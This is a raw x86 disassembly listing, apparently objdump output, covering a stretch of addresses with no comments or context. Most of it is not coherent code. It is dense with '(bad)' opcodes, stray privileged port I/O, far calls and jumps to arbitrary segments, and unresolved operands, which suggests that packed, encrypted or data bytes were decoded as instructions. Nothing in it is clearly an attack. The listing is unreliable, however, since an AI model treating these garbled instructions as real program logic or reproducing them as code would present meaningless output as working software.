  421b9d:	out    0xe1,eax
  421b9f:	inc    edi
  421ba0:	jl     0x421bb9
  421ba2:	mov    ecx,0x89262d7
  421ba7:	or     edx,DWORD PTR [edi+ebp*8]
  421baa:	out    0xe1,eax
  421bac:	inc    edi
  421bad:	jl     0x421bc6
  421baf:	mov    ecx,0x89262d7
  421bb4:	or     edx,DWORD PTR [edi+ebp*8]
  421bb7:	out    0xe1,eax
  421bb9:	inc    edi
  421bba:	jl     0x421bd3
  421bbc:	mov    ecx,0x89262d7
  421bc1:	or     edx,DWORD PTR [edi+ebp*8]
  421bc4:	out    0xe1,eax
  421bc6:	inc    edi
  421bc7:	jl     0x421be0
  421bc9:	mov    ecx,0x89262d7
  421bce:	or     edx,DWORD PTR [edi+ebp*8]
  421bd1:	out    0xe1,eax
  421bd3:	inc    edi
  421bd4:	jl     0x421bed
  421bd6:	mov    ecx,0x89262d7
  421bdb:	or     edx,DWORD PTR [edi+ebp*8]
  421bde:	out    0xe1,eax
  421be0:	inc    edi
  421be1:	jl     0x421bfa
  421be3:	mov    ecx,0x89262d7
  421be8:	or     edi,DWORD PTR [ebx+0x47]
  421beb:	in     al,dx
  421bec:	loope  0x421c56
  421bee:	jl     0x421c07
  421bf0:	test   eax,0xaab862d7
  421bf5:	shl    DWORD PTR [ebp-0x77],1
  421bf8:	sbb    ah,cl
  421bfa:	fsincos 
  421bfc:	inc    edi
  421bfd:	push   esp
  421bfe:	loope  0x421b8a
  421c00:	cmp    DWORD PTR [esi+ebx*4-0x449c618e],0xafa0cd54
  421c0b:	mov    edx,0xcd891886
  421c10:	cmp    cl,BYTE PTR [ebp+0x4f7ede77]
  421c16:	pop    eax
  421c17:	or     al,al
  421c19:	inc    eax
  421c1a:	xchg   edx,eax
  421c1b:	das    
  421c1c:	lods   al,BYTE PTR ds:[esi]
  421c1d:	pushf  
  421c1e:	mov    edx,0x4eee8cb6
  421c23:	sub    ah,BYTE PTR [ebx+eax*8-0x2d]
  421c27:	repnz pop es
  421c29:	aad    0x30
  421c2b:	push   esp
  421c2c:	stos   DWORD PTR es:[edi],eax
  421c2d:	xor    al,BYTE PTR [edx-0x22d810ad]
  421c33:	(bad)  
  421c34:	imul   BYTE PTR [eax]
  421c36:	test   al,0x1b
  421c38:	push   ds
  421c39:	dec    ebp
  421c3a:	int3   
  421c3b:	add    al,BYTE PTR [ecx+edx*2]
  421c3e:	call   0x4e65c8d7
  421c43:	and    ch,BYTE PTR [ecx+0x72]
  421c46:	mov    bx,0x7ba5
  421c4a:	mov    ds:0x7609e43b,eax
  421c4f:	sub    ebx,edi
  421c51:	jne    0x421cb7
  421c53:	xchg   DWORD PTR [edi+0x53],eax
  421c56:	push   eax
  421c57:	lock adc bh,bh
  421c5a:	sub    DWORD PTR [ebp+0x37],esi
  421c5d:	stos   DWORD PTR es:[edi],eax
  421c5e:	cmpxchg BYTE PTR [ebp+0x5b],dl
  421c62:	add    eax,eax
  421c64:	ins    BYTE PTR es:[edi],dx
  421c65:	nop
  421c66:	xchg   ebp,eax
  421c67:	dec    esp
  421c68:	ins    DWORD PTR es:[edi],dx
  421c69:	cmp    DWORD PTR [edx],edi
  421c6b:	fcomp  DWORD PTR [eax-0x18]
  421c6e:	(bad)  
  421c6f:	in     eax,0x22
  421c71:	stos   BYTE PTR es:[edi],al
  421c72:	xchg   esp,eax
  421c73:	frstor [edi]
  421c75:	push   esi
  421c76:	popf   
  421c77:	inc    edx
  421c78:	fadd   QWORD PTR [ebx+0x3ffb33f2]
  421c7f:	sti    
  421c80:	mov    esp,esp
  421c82:	das    
  421c83:	and    eax,0xb6631ef9
  421c88:	stc    
  421c89:	hlt    
  421c8a:	jp     0x421c44
  421c8c:	repz daa 
  421c8e:	js     0x421cab
  421c90:	dec    eax
  421c91:	inc    esp
  421c92:	or     al,0xc3
  421c94:	push   ecx
  421c95:	or     edi,edi
  421c97:	push   es
  421c98:	cmp    ebp,DWORD PTR [edi]
  421c9a:	es in  eax,dx
  421c9c:	clc    
  421c9d:	cmp    BYTE PTR [esi],bl
  421c9f:	ds call 0xccf7a737
  421ca5:	sub    DWORD PTR [ebx],ebp
  421ca7:	adc    al,0xa9
  421ca9:	outs   dx,BYTE PTR ds:[esi]
  421caa:	add    DWORD PTR ds:0x553a2d96,edx
  421cb0:	fs xchg ebx,eax
  421cb2:	mov    eax,0xbaed0666
  421cb7:	pop    esi
  421cb8:	(bad)
  421cbb:	lock fwait
  421cbd:	jp     0x421c49
  421cbf:	sbb    esi,edi
  421cc1:	and    eax,edx
  421cc3:	add    DWORD PTR [ebx+0x6f78a9a6],0xe0941ae2
  421ccd:	rol    ebp,0x2e
  421cd0:	sub    dh,0xf5
  421cd3:	sti    
  421cd4:	mov    edi,0x97366917
  421cd9:	push   es
  421cda:	dec    ebp
  421cdb:	or     eax,DWORD PTR [ebx+0xdd76ab2]
  421ce1:	retf   
  421ce2:	call   0xec61:0x9440aeab
  421ce9:	push   ecx
  421cea:	ror    DWORD PTR [esi+0x4318c367],0x55
  421cf1:	rcl    esi,0x9
  421cf4:	repnz push ds
  421cf6:	cld    
  421cf7:	ror    eax,cl
  421cf9:	sub    eax,0x425648da
  421cfe:	cmp    eax,ebx
  421d00:	dec    ebp
  421d01:	sub    DWORD PTR [ebx],ebp
  421d03:	ins    DWORD PTR es:[edi],dx
  421d04:	mov    ?,WORD PTR [ebx-0x6489d7f8]
  421d0a:	lods   al,BYTE PTR ds:[esi]
  421d0b:	jb     0x421cf2
  421d0d:	pop    ss
  421d0e:	ins    DWORD PTR es:[edi],dx
  421d0f:	(bad)  
  421d10:	or     ecx,ecx
  421d12:	(bad)  
  421d14:	and    eax,0x62
  421d17:	fwait
  421d18:	cmp    DWORD PTR [ebp-0x5ba2bdda],0x17
  421d1f:	dec    ecx
  421d20:	jp     0x421d15
  421d22:	sar    DWORD PTR ds:0xeecdb6a6,0x18
  421d29:	(bad)  
  421d2a:	lods   al,BYTE PTR ds:[esi]
  421d2b:	xchg   edi,eax
  421d2c:	mov    dl,0xff
  421d2e:	popa   
  421d2f:	mov    eax,ds:0x2b92d52b
  421d34:	mov    edi,0x39382e23
  421d3a:	xchg   DWORD PTR [ebp+0x1d],edi
  421d3d:	(bad)  
  421d3f:	cmp    bl,bl
  421d41:	mov    WORD PTR [edi+0x633a52f9],?
  421d47:	(bad)  
  421d48:	or     edi,ebx
  421d4a:	and    ebp,DWORD PTR [ebp-0x2e33669d]
  421d50:	fdivr  DWORD PTR ds:0xec124f00
  421d56:	mov    edx,0x55846de1
  421d5b:	rcl    esp,1
  421d5d:	mov    al,ds:0x97b7f1d3
  421d62:	mov    esi,0xcac2369
  421d67:	inc    edx
  421d68:	popa   
  421d69:	sbb    BYTE PTR [ebx],dl
  421d6b:	sbb    al,0xc7
  421d6d:	sub    al,0x5c
  421d6f:	inc    eax
  421d70:	ret    0x68e9
  421d73:	out    0xe1,eax
  421d75:	dec    ebx
  421d76:	adc    eax,DWORD PTR [esi]
  421d78:	imul   edx,DWORD PTR [esi+eiz*1-0x68ee5488],0xffffffa9
  421d80:	cmp    dl,cl
  421d82:	xchg   bh,dh
  421d84:	adc    ebp,0xffffff9a
  421d87:	js     0x421e02
  421d89:	shr    DWORD PTR [ecx-0x28c13c1d],cl
  421d8f:	xor    eax,0xaf48ceda
  421d94:	out    0xed,eax
  421d96:	push   0x56
  421d98:	mov    fs,WORD PTR [ebx+0x4c]
  421d9b:	cmp    DWORD PTR [ecx-0x38],esi
  421d9e:	push   ecx
  421d9f:	lock ins DWORD PTR es:[edi],dx
  421da1:	popa   
  421da2:	stos   BYTE PTR es:[edi],al
  421da3:	outs   dx,BYTE PTR ds:[esi]
  421da4:	add    esi,DWORD PTR [ecx]
  421da6:	ret    
  421da7:	or     al,0x1
  421da9:	test   eax,ebx
  421dab:	enter  0x9c27,0xf4
  421daf:	push   es
  421db0:	mov    esp,0x2e36d71
  421db5:	in     al,dx
  421db6:	outs   dx,DWORD PTR ds:[esi]
  421db7:	mov    ecx,0xcc150b82
  421dbc:	fnsave ds:0x406c3c71
  421dc2:	jmp    0xb709:0x32c10ecd
  421dc9:	fisttp QWORD PTR [ecx-0x2767615]
  421dcf:	push   ss
  421dd0:	jmp    ebx
  421dd2:	stos   DWORD PTR es:[edi],eax
  421dd3:	mov    edx,0x95fe4dc8
  421dd8:	jo     0x421d8e
  421dda:	sar    BYTE PTR [esi+0x5bf5bccd],cl
  421de0:	mov    bh,0x5d
  421de2:	jnp    0x421dad
  421de4:	ins    DWORD PTR es:[edi],dx
  421de5:	mov    DWORD PTR ds:0x9be1aaec,0xe0190677
  421def:	xor    BYTE PTR [ebx-0x64],0x23
  421df3:	sbb    al,0xd8
  421df5:	mov    ?,esp
  421df7:	repnz mov edx,0xc5de96bd
  421dfd:	adc    al,0x27
  421dff:	sub    esi,ebx
  421e01:	clc    
  421e02:	in     eax,dx
  421e03:	pusha  
  421e04:	aam    0x3f
  421e06:	sbb    eax,0x27032eed
  421e0b:	push   es
  421e0c:	dec    BYTE PTR [eax-0x51]
  421e0f:	add    ah,ah
  421e11:	cmp    ebp,ebp
  421e13:	or     ch,BYTE PTR [edi]
  421e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e16:	jnp    0x421e2d
  421e18:	cmc    
  421e19:	lods   al,BYTE PTR ds:[esi]
  421e1a:	jmp    0x421dd6
  421e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e1d:	pusha  
  421e1e:	mov    eax,ds:0x8c5af09b
  421e23:	xchg   DWORD PTR [edx-0x56],ecx
  421e26:	mov    WORD PTR [ebx-0x3eb73104],ss
  421e2c:	or     BYTE PTR cs:0xc24d1a81,bh
  421e33:	repnz ss and eax,0xfcb69516
  421e3a:	out    dx,eax
  421e3b:	fs popf 
  421e3d:	jae    0x421ddf
  421e3f:	push   esp
  421e40:	leave  
  421e41:	xchg   ebx,eax
  421e42:	cmp    BYTE PTR [edi],bl
  421e44:	fisttp WORD PTR [ebx+edi*8]
  421e47:	(bad)  
  421e48:	xor    al,0x4e
  421e4a:	add    al,0x54
  421e4c:	test   edi,ebx
  421e4e:	dec    ebp
  421e4f:	test   BYTE PTR [edx+0x41],bl
  421e52:	push   esp
  421e53:	inc    ecx
  421e54:	sub    DWORD PTR [ecx-0x5c],ebp
  421e57:	adc    ebp,DWORD PTR [eax+0x2b]
  421e5a:	or     BYTE PTR [esi],bl
  421e5c:	inc    edx
  421e5d:	mov    bl,0x3
  421e5f:	add    al,al
  421e61:	sub    DWORD PTR [edx],esi
  421e63:	xchg   ebp,eax
  421e64:	nop
  421e65:	les    ebx,FWORD PTR [eax+eax*2+0x3c]
  421e69:	or     ebp,DWORD PTR [ebx]
  421e6b:	add    bl,ch
  421e6d:	add    eax,0x3246f397
  421e72:	add    BYTE PTR [esi-0x7465ba05],ch
  421e78:	sbb    ah,BYTE PTR [ebx-0x120dc233]
  421e7e:	inc    ebx
  421e7f:	fistp  DWORD PTR [esi-0x69]
  421e82:	pop    edi
  421e83:	gs mov ah,0x90
  421e86:	jge    0x421e2e
  421e88:	push   eax
  421e89:	cs adc al,0x47
  421e8c:	adc    al,0xf3
  421e8e:	mov    esi,0x7cd1e94a
  421e93:	stos   BYTE PTR es:[edi],al
  421e94:	and    BYTE PTR [ebp+0x15],bh
  421e97:	sbb    BYTE PTR [edx],dl
  421e99:	adc    DWORD PTR [esi],0xffffffe6
  421e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9d:	or     DWORD PTR [ebp-0x4c],ebp
  421ea0:	jecxz  0x421e9c
  421ea2:	sahf   
  421ea3:	fld    st(1)
  421ea5:	pop    esp
  421ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ea7:	and    al,0x44
  421ea9:	cld    
  421eaa:	xchg   ecx,eax
  421eab:	mov    ds:0x19dc6e6b,al
  421eb0:	out    dx,eax
  421eb1:	call   FWORD PTR [esi]
  421eb3:	inc    esi
  421eb4:	fisubr DWORD PTR [eax+0xc]
  421eb7:	xor    bl,BYTE PTR [edi]
  421eb9:	outs   dx,DWORD PTR ds:[esi]
  421eba:	inc    eax
  421ebb:	fst    st(5)
  421ebd:	jae    0x421ee9
  421ebf:	jae    0x421e4b
  421ec1:	lahf   
  421ec2:	dec    ebx
  421ec3:	sbb    eax,0xd2e667f6
  421ec8:	xchg   ecx,eax
  421ec9:	(bad)  
  421ecb:	call   0x40b63bcf
  421ed0:	in     al,0x72
  421ed2:	pop    ss
  421ed3:	sbb    DWORD PTR [esi+edi*4],eax
  421ed6:	aas    
  421ed7:	popf   
  421ed8:	jbe    0x421eac
  421eda:	or     al,0x6a
  421edc:	dec    ebp
  421edd:	xor    ebx,0xe7a80832
  421ee3:	xor    esi,DWORD PTR ds:0xcfe19010
  421ee9:	fld    DWORD PTR [esi+0x9]
  421eec:	scas   eax,DWORD PTR es:[edi]
  421eed:	bound  edi,QWORD PTR [edi+0x39]
  421ef0:	retf   0xe57d
  421ef3:	imul   esp,ebx,0x1c
  421ef6:	enter  0x1777,0x99
  421efa:	int    0x9f
  421efc:	lds    edx,FWORD PTR [ecx+eiz*1-0x50]
  421f00:	and    eax,edx
  421f02:	mov    al,ds:0xcdfbd1e1
  421f07:	push   0x2
  421f09:	stos   DWORD PTR es:[edi],eax
  421f0a:	adc    edi,esp
  421f0c:	mov    edx,0x8cc5cb
  421f11:	or     esp,0x41
  421f14:	nop
  421f15:	jb     0x421f60
  421f17:	test   al,0xea
  421f19:	dec    edi
  421f1a:	pop    ebx
  421f1b:	mov    al,ds:0x8f2dd773
  421f20:	push   0xffffffa0
  421f22:	xor    DWORD PTR [edi-0x6a2a41e2],esi
  421f28:	mov    WORD PTR [esi+0x33],ss
  421f2b:	cmp    ch,BYTE PTR [ebp+0x29f72b01]
  421f31:	adc    eax,0x5b565a3
  421f36:	lods   al,BYTE PTR ds:[esi]
  421f37:	stos   DWORD PTR es:[edi],eax
  421f38:	(bad)  
  421f39:	adc    ebx,DWORD PTR [eax-0x5895320]
  421f3f:	(bad)
  421f42:	xchg   edi,eax
  421f43:	cmp    al,0x38
  421f45:	retf   
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	and    eax,DWORD PTR [eax-0x5b30b946]
  421f4d:	jp     0x421ef8
  421f4f:	add    ebx,DWORD PTR [ebx]
  421f51:	pop    ecx
  421f52:	adc    eax,0xcc743def
  421f57:	divps  xmm3,xmm7
  421f5a:	jnp    0x421f1a
  421f5c:	or     al,0xa4
  421f5e:	mov    ebx,0x9638b9ad
  421f63:	pusha  
  421f64:	mov    dl,0xf8
  421f66:	shr    DWORD PTR [esi+edi*1-0x441d2026],cl
  421f6d:	mov    cl,0xc5
  421f6f:	xchg   ecx,eax
  421f70:	enter  0x9a02,0x86
  421f74:	xor    DWORD PTR [esp+ebp*8-0x61],esp
  421f78:	js     0x421fe4
  421f7a:	div    DWORD PTR [esi-0x62556854]
  421f80:	cmp    BYTE PTR [edi+0xe],cl
  421f83:	pop    ecx
  421f84:	jne    0x421f38
  421f86:	add    al,0xbe
  421f88:	out    0xea,al
  421f8a:	stc    
  421f8b:	push   eax
  421f8c:	stos   BYTE PTR es:[edi],al
  421f8d:	(bad)  
  421f8f:	jle    0x421f29
  421f91:	sahf   
  421f92:	add    BYTE PTR [edi-0x26],0x29
  421f96:	xchg   edi,eax
  421f97:	add    DWORD PTR [edx-0x4c],esp
  421f9a:	mov    es,WORD PTR [ecx]
  421f9c:	jle    0x421f8c
  421f9e:	int3   
  421f9f:	ds xor al,0xf0
  421fa2:	xor    al,0x8a
  421fa4:	out    dx,eax
  421fa5:	stos   BYTE PTR es:[edi],al
  421fa6:	add    al,0xe8
  421fa8:	inc    edi
  421fa9:	push   eax
  421faa:	or     DWORD PTR [edi+eiz*8+0x5d],0xed28bf86
  421fb2:	add    ch,BYTE PTR [ebp-0x6d]
  421fb5:	mov    dh,0x56
  421fb7:	and    BYTE PTR [eax+0x7b],0xd1
  421fbb:	loope  0x422017
  421fbd:	test   BYTE PTR [ebp+0x4e],ah
  421fc0:	ret    0x44b8
  421fc3:	ret    
  421fc4:	dec    edx
  421fc5:	cmp    cl,BYTE PTR [edi+0x9]
  421fc8:	inc    esi
  421fc9:	pop    ecx
  421fca:	mov    BYTE PTR [edi+eax*4-0x10],bl
  421fce:	pop    eax
  421fcf:	sti    
  421fd0:	fldenv [esi+0x7]
  421fd3:	pop    esp
  421fd4:	ds pop eax
  421fd6:	aad    0xd3
  421fd8:	lahf   
  421fd9:	sub    BYTE PTR [eax],bh
  421fdb:	cwde   
  421fdc:	jmp    0x421fbc
  421fde:	jge    0x421ffe
  421fe0:	sahf   
  421fe1:	add    al,0x3f
  421fe3:	outs   dx,BYTE PTR ds:[esi]
  421fe4:	jecxz  0x421ff5
  421fe6:	adc    BYTE PTR es:0x33121f88,ah
  421fed:	mov    al,0x29
  421fef:	lahf   
  421ff0:	ja     0x422038
  421ff2:	dec    esi
  421ff3:	mov    ah,0x59
  421ff5:	cmp    al,ch
  421ff7:	adc    edx,ecx
  421ff9:	jle    0x421f98
  421ffb:	xor    DWORD PTR [esi],ecx
  421ffd:	mov    edx,0x3da08ccf
  422002:	cdq    
  422003:	aad    0x5f
  422005:	sub    eax,0xe7134970
  42200a:	frstor [edx-0x477db92a]
  422010:	xchg   DWORD PTR ds:0x6a818f6f,ebp
  422016:	hlt    
  422017:	scas   al,BYTE PTR es:[edi]
  422018:	lods   al,BYTE PTR ds:[esi]
  422019:	iret   
  42201a:	lods   al,BYTE PTR ds:[esi]
  42201b:	loope  0x421fb4
  42201d:	sti    
  42201e:	in     eax,0x68
  422020:	mov    esi,0xee4c6ab4
  422025:	inc    edi
  422026:	mov    BYTE PTR [ecx+0x1dce044],cl
  42202c:	popf   
  42202d:	mov    bl,bl
  42202f:	pop    edi
  422030:	out    0x5d,al
  422032:	daa    
  422033:	adc    esp,DWORD PTR [esi-0x47377f81]
  422039:	pop    esp
  42203a:	jle    0x422037
  42203c:	popf   
  42203d:	call   0x763e1293
  422042:	out    0xed,eax
  422044:	test   al,0xdf
  422046:	pop    edi
  422047:	push   cs
  422048:	mov    ch,0xc8
  42204a:	int    0xb4
  42204c:	std    
  42204d:	rol    DWORD PTR [eax+0x7e],1
  422050:	dec    esp
  422051:	cmp    DWORD PTR [ebx-0x731a7c29],ebx
  422057:	ss sub eax,0xcc167f82
  42205d:	popa   
  42205e:	(bad)  
  42205f:	call   0x8a59:0xc9834818
  422066:	aaa    
  422067:	inc    esp
  422068:	lods   eax,DWORD PTR ds:[esi]
  422069:	push   eax
  42206a:	xchg   edi,eax
  42206b:	shl    DWORD PTR [ebx+0x6c3ebae5],1
  422071:	fdiv   DWORD PTR [edi]
  422073:	inc    edi
  422074:	(bad)  
  422075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422076:	or     BYTE PTR [edx],dl
  422078:	cmp    ebx,ecx
  42207a:	ds into 
  42207c:	dec    eax
  42207d:	xchg   esi,eax
  42207e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42207f:	push   ebp
  422080:	jecxz  0x422057
  422082:	fdiv   QWORD PTR [esi+ebp*2-0xf5057e1]
  422089:	cmp    edi,edx
  42208b:	sbb    dh,BYTE PTR [edi]
  42208d:	fsubr  QWORD PTR [ecx-0x14]
  422090:	dec    esi
  422091:	inc    edx
  422092:	add    DWORD PTR [edi],eax
  422094:	out    0xee,eax
  422096:	nop
  422097:	add    DWORD PTR [edi],ebp
  422099:	mov    al,ds:0xdc083b09
  42209e:	mov    fs,esp
  4220a0:	in     al,0x27
  4220a2:	add    BYTE PTR [eax-0x752721bd],ah
  4220a8:	jbe    0x42206f
  4220aa:	fimul  WORD PTR [ebp-0x6f3ac8d6]
  4220b0:	mov    edx,edi
  4220b2:	fcom   DWORD PTR [ebx+0x47640f7f]
  4220b8:	pop    esp
  4220b9:	jnp    0x4220d6
  4220bb:	stos   BYTE PTR es:[edi],al
  4220bc:	and    BYTE PTR [edx-0x6f],ah
  4220bf:	rcl    DWORD PTR [ecx-0x21],cl
  4220c2:	push   ds
  4220c3:	jmp    0xaef29882
  4220c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220c9:	mov    ecx,0xd719d9f5
  4220ce:	(bad)  
  4220cf:	in     eax,dx
  4220d0:	ins    DWORD PTR es:[edi],dx
  4220d1:	sub    eax,DWORD PTR [ecx]
  4220d3:	daa    
  4220d4:	or     eax,0x55e79810
  4220d9:	aad    0x4e
  4220db:	or     al,0x62
  4220dd:	inc    DWORD PTR [ecx+0x2a086b95]
  4220e3:	sahf   
  4220e4:	jle    0x422074
  4220e6:	xor    BYTE PTR [edx-0x62],ch
  4220e9:	mov    ebx,0xb06466f4
  4220ee:	in     al,dx
  4220ef:	xchg   cl,dl
  4220f1:	mov    ds:0x355ad1e1,al
  4220f6:	inc    esp
  4220f7:	cmp    eax,0x916477b3
  4220fc:	push   ds
  4220fd:	mov    cl,0xdb
  4220ff:	addr16 mov esi,0x4fafdf48
  422105:	fimul  DWORD PTR [eax-0x22e03033]
  42210b:	mov    ecx,0xedeada3d
  422110:	pop    edx
  422111:	cli    
  422112:	aam    0x4f
  422114:	lahf   
  422115:	leave  
  422116:	mov    esp,0x700016bd
  42211b:	dec    ebx
  42211c:	xor    DWORD PTR [ebp-0xc],esp
  42211f:	fild   QWORD PTR [ebx+0x10]
  422122:	fnstcw WORD PTR [esi-0x1d19a066]
  422128:	or     eax,0x62c60801
  42212d:	ins    DWORD PTR es:[edi],dx
  42212e:	iret   
  42212f:	push   esi
  422131:	jmp    0x7d1e:0x82c92b50
  422138:	das    
  422139:	add    al,0x37
  42213b:	sub    bl,BYTE PTR [esi+ecx*2+0x51945fbb]
  422142:	sub    cl,BYTE PTR [ebp-0x1f]
  422145:	add    al,0xb2
  422147:	(bad)  [eax+0x6d]
  42214a:	(bad)  
  42214b:	and    ebx,DWORD PTR [esi]
  42214d:	or     al,0x80
  42214f:	mov    edx,0x64b4678b
  422154:	sbb    ch,BYTE PTR [ecx]
  422156:	popf   
  422157:	xor    ch,BYTE PTR [edi-0x3]
  42215a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42215b:	xchg   DWORD PTR [ecx+eiz*4+0x35],esi
  42215f:	mov    ds:0xecfa09d8,al
  422164:	(bad)  [eax+0x73]
  422167:	mov    ah,BYTE PTR [edi+0x5f3a7443]
  42216d:	push   cs
  42216e:	loope  0x422176
  422170:	sbb    ebp,DWORD PTR [ebx+0x59f2a6c4]
  422176:	mov    esp,0x34541b1c
  42217b:	addr16 aas 
  42217d:	je     0x4221a6
  42217f:	cmp    bl,BYTE PTR [eax+0x39]
  422182:	ins    DWORD PTR es:[edi],dx
  422183:	push   ecx
  422184:	mov    edi,0xdf5c3fc1
  422189:	into   
  42218a:	hlt    
  42218b:	inc    DWORD PTR [esi]
  42218d:	aad    0x7
  42218f:	xchg   BYTE PTR [esi],ah
  422191:	call   0x8b12:0xd2ada506
  422198:	push   edi
  422199:	mov    dl,BYTE PTR [edx-0x5cb8cc54]
  42219f:	imul   ecx,DWORD PTR [ebx-0x5f9de468],0x9efb8ba7
  4221a9:	sbb    dl,BYTE PTR [eax-0x64]
  4221ac:	ror    BYTE PTR [edx+0x17],cl
  4221af:	adc    DWORD PTR [edx+0x39],ebp
  4221b2:	dec    eax
  4221b3:	pop    ebp
  4221b4:	jmp    0x5d8ec09e
  4221b9:	leave  
  4221ba:	fbstp  TBYTE PTR [ecx-0x7c]
  4221bd:	into   
  4221be:	xchg   esi,eax
  4221bf:	mov    ebx,0x2e81dd03
  4221c4:	push   0x142c8021
  4221c9:	(bad)  
  4221ca:	imul   ecx,ebp,0xfb7afe18
  4221d0:	sbb    BYTE PTR [ebp-0x612a5819],cl
  4221d6:	aaa    
  4221d7:	out    0x64,eax
  4221d9:	popf   
  4221da:	push   ss
  4221db:	cmp    al,0x9e
  4221dd:	adc    ebx,ebp
  4221df:	add    eax,0xdb680a28
  4221e4:	out    0xc6,al
  4221e6:	ss mov cl,0x1c
  4221e9:	jbe    0x4221be
  4221eb:	mov    edi,0x5f772a88
  4221f0:	je     0x4221b6
  4221f2:	in     eax,0x55
  4221f4:	mov    ecx,0x8c90238b
  4221f9:	add    BYTE PTR [eax],dl
  4221fb:	mov    ebx,0xe33b4d7b
  422200:	test   BYTE PTR [esi],dh
  422202:	jecxz  0x422245
  422204:	mov    ds:0x99a7b16,eax
  422209:	call   FWORD PTR [ecx+0x1395b316]
  42220f:	adc    eax,0xfd79413a
  422214:	retf   0x58ac
  422217:	pop    ds
  422218:	jp     0x422212
  42221a:	daa    
  42221b:	jmp    0x3820dce3
  422220:	xchg   ebp,eax
  422221:	mov    bl,0xa3
  422223:	inc    ebx
  422224:	xchg   bl,cl
  422226:	cmp    dh,ah
  422228:	and    bl,BYTE PTR [eiz*4+0x2406e1b6]
  42222f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422230:	(bad)  
  422231:	mov    edi,0xbccab0e0
  422236:	(bad)  
  422237:	dec    esi
  422238:	lods   eax,DWORD PTR ds:[esi]
  422239:	xor    eax,0xb69eb70f
  42223e:	jo     0x422219
  422240:	mov    WORD PTR [edx-0x54802550],ss
  422246:	dec    esp
  422247:	pop    edi
  422248:	push   edi
  422249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42224a:	popa   
  42224b:	sahf   
  42224c:	(bad)  
  42224d:	scas   eax,DWORD PTR es:[edi]
  42224e:	dec    BYTE PTR [eax+0x1a]
  422251:	imul   edi,ecx,0xb0a595be
  422257:	pop    ebp
  422258:	mov    al,BYTE PTR [esi-0x5c]
  42225b:	cld    
  42225c:	dec    edi
  42225d:	sub    DWORD PTR [edi-0x2c],edi
  422260:	es dec esp
  422262:	or     eax,DWORD PTR [edi+0x2ba36b1f]
  422268:	ss inc ecx
  42226a:	add    dh,BYTE PTR [esi-0x35a1ec6f]
  422270:	sbb    ah,cl
  422272:	pop    sp
  422274:	or     ch,bh
  422276:	adc    BYTE PTR [eax+edx*2-0x4d5bff7a],dh
  42227d:	out    dx,eax
  42227e:	lahf   
  42227f:	pushf  
  422280:	ins    BYTE PTR es:[edi],dx
  422281:	sbb    eax,0x70899ec
  422286:	pop    edi
  422287:	fcom   QWORD PTR [eax+0x44]
  42228a:	cwde   
  42228b:	pop    esp
  42228c:	mov    edi,0xe07b4c1e
  422291:	jne    0x422262
  422293:	pop    ss
  422294:	and    esi,DWORD PTR [edi-0x5443c68c]
  42229a:	enter  0x5d7,0x5
  42229e:	and    BYTE PTR [edx+ebx*1-0x17],bh
  4222a2:	(bad)  
  4222a3:	out    0x2d,ax
  4222a6:	idiv   BYTE PTR [ebp-0x22]
  4222a9:	(bad)  
  4222aa:	xchg   edx,eax
  4222ab:	stos   DWORD PTR es:[edi],eax
  4222ac:	sti    
  4222ad:	mov    bh,0x40
  4222af:	mov    WORD PTR [edi-0x6098b19a],ds
  4222b5:	aaa    
  4222b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222b7:	mov    ebx,DWORD PTR [ecx]
  4222b9:	loope  0x422274
  4222bb:	out    dx,eax
  4222bc:	cmp    DWORD PTR [edx],edi
  4222be:	stos   BYTE PTR es:[edi],al
  4222bf:	jmp    0x2e60b3a1
  4222c4:	push   0xffffffa4
  4222c6:	cmp    esp,DWORD PTR [eax-0x35]
  4222c9:	inc    esp
  4222ca:	adc    ecx,DWORD PTR [ebp-0x4bfa57b8]
  4222d0:	fisttp DWORD PTR [edx]
  4222d2:	mov    eax,ds:0x4649eb21
  4222d7:	cmp    eax,0xcdf1c32b
  4222dc:	stc    
  4222dd:	sbb    ch,BYTE PTR [edi]
  4222df:	sbb    esp,DWORD PTR [eax]
  4222e1:	xchg   ebx,ebx
  4222e3:	and    eax,0xebfa2e44
  4222e8:	add    eax,edi
  4222ea:	adc    BYTE PTR [ebx+0x5369445e],cl
  4222f0:	retf   
  4222f1:	mov    esi,0xf5169cd3
  4222f6:	outs   dx,BYTE PTR ds:[esi]
  4222f7:	push   ecx
  4222f8:	add    esi,edi
  4222fa:	or     eax,0x876e64d3
  4222ff:	fwait
  422300:	pop    esi
  422301:	pop    edi
  422302:	imul   esi,DWORD PTR [edx+0xfecdf94],0xffffff8f
  422309:	mov    eax,0xd1872279
  42230e:	pop    edx
  42230f:	or     al,0x58
  422311:	adc    edi,DWORD PTR [ebp+edi*2+0x25]
  422315:	sub    DWORD PTR [edi],eax
  422317:	pop    ecx
  422318:	inc    bx
  42231a:	mov    bl,0x37
  42231c:	stos   DWORD PTR es:[edi],eax
  42231d:	or     bh,0x2b
  422320:	loope  0x42238c
  422322:	in     eax,0xf9
  422324:	and    eax,0x93b46d04
  422329:	jo     0x42238f
  42232b:	jmp    0xaa4aa90a
  422330:	fwait
  422331:	(bad)  
  422332:	sub    edi,DWORD PTR [ebx]
  422334:	mov    ecx,edi
  422336:	sti    
  422337:	mov    eax,ds:0x9e554975
  42233c:	xor    al,0x42
  42233e:	(bad)  
  422340:	and    DWORD PTR [edi],eax
  422342:	xchg   ebx,eax
  422343:	mov    ds:0x493c38bb,eax
  422348:	mov    al,ds:0xc6d3723c
  42234d:	push   edi
  42234e:	and    al,0xea
  422350:	shl    DWORD PTR [ebp-0x7ee3eb19],1
  422356:	popaw  
  422358:	rcr    dh,1
  42235a:	out    0x73,eax
  42235c:	call   0x165448df
  422361:	cli    
  422362:	xor    dl,bh
  422364:	clc    
  422365:	fs scas al,BYTE PTR es:[edi]
  422367:	fcomp  st(7)
  422369:	or     eax,0x254fbd
  42236e:	add    esi,DWORD PTR [edx+0x2e]
  422371:	pop    ebp
